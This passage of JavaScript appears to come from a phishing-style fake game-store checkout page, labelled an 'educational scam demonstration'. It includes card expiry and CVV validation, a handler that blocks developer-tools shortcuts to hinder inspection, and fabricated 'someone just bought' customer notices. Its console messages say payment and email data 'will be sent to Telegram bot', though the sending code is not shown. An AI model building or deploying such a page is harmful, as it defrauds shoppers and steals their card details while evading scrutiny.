    const currentMonth = currentDate.getMonth() + 1;
    
    if (month < 1 || month > 12) return false;
    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
    
    return true;
}

function validateCVV(cvv, cardType) {
    const expectedLength = cardType === 'amex' ? 4 : 3;
    return cvv.length === expectedLength && /^\d+$/.test(cvv);
}

// Page load analytics for demonstration
function trackPageLoad() {
    const pageData = {
        page: 'Game Page - ' + (document.querySelector('.game-title')?.textContent || 'Unknown Game'),
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screenResolution: `${screen.width}x${screen.height}`,
        language: navigator.language,
        referrer: document.referrer || 'Direct',
        loadTime: performance.now()
    };
    
    console.log('Page Analytics (Educational Demo):', pageData);
}

// Page exit intent detection (common scam tactic)
let exitIntentShown = false;
document.addEventListener('mouseleave', function(e) {
    if (e.clientY <= 0 && !exitIntentShown) {
        exitIntentShown = true;
        setTimeout(() => {
            if (!document.getElementById('paymentModal')?.classList.contains('active') && 
                !document.getElementById('emailModal')?.classList.contains('active')) {
               // showNotification('⚡ Don\'t miss this deal! 83% off expires soon!', 'warning');
            }
        }, 3000);
    }
});

// Prevent developer tools (basic attempt)
document.addEventListener('keydown', function(e) {
    // Prevent F12, Ctrl+Shift+I, Ctrl+U, etc.
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.key === 'u') ||
        (e.ctrlKey && e.shiftKey && e.key === 'C')) {
        e.preventDefault();
       // showNotification('🔒 Developer tools disabled for security', 'warning');
    }
});

// Fake "other customers" activity
function simulateCustomerActivity() {
    const activities = [
        'Someone from New York just bought Beat Saber!',
        'Customer from London purchased SUPERHOT VR!',
        'Tokyo customer just saved $25 on this deal!',
        'Someone from Sydney bought 3 games in 5 minutes!',
        'Customer from Berlin just left a 5-star review!',
        'Someone from Toronto just shared this deal!',
        'Paris customer purchased and downloaded instantly!',
        'Customer from Seoul just bought the same game!'
    ];
    
    setInterval(() => {
        if (Math.random() < 0.15) { // 15% chance every interval
            const activity = activities[Math.floor(Math.random() * activities.length)];
           // showNotification('👥 ' + activity, 'info');
        }
    }, 25000);
}

// Start customer activity simulation
setTimeout(simulateCustomerActivity, 10000); // Start after 10 seconds

// Initialize page tracking
setTimeout(trackPageLoad, 1000);

// Show welcome message after page loads
setTimeout(() => {
    console.log('🎮 Game Page Loaded Successfully!');
    console.log('📊 Features Active: 2-Step Payment Modal, Email Collection, Card Validation, Telegram Integration');
    console.log('🎭 Educational scam demonstration - All data will be sent to Telegram bot');
}, 2000);

// Performance monitoring for page optimization
function monitorPerformance() {
    if ('performance' in window) {
        const perfData = {
            loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
            domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
            firstPaint: performance.getEntriesByType('paint')[0]?.startTime || 0,
            resources: performance.getEntriesByType('resource').length
        };
        
        console.log('Performance Metrics (Educational Demo):', perfData);
    }
}

// Monitor performance after page load
window.addEventListener('load', () => {
    setTimeout(monitorPerformance, 1000);
});